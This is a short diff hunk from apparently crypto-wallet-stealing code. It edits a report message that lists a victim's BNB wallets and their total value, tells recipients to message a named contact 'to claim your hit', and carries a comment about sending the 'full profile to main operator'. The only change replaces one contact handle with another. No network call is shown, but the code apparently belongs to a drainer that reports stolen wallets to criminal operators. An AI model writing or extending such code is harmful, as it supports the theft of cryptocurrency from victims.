@@ -233,7 +233,7 @@ ${bnbWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${walle
 💵 **Total Value: $${totalValue.toFixed(2)}**
 ⏰ ${new Date().toLocaleString()}
 
-✅ Message startjaden to claim your hit!
+✅ Message zyloxas to claim your hit!
     `.trim();
     
     // Send full profile to main operator
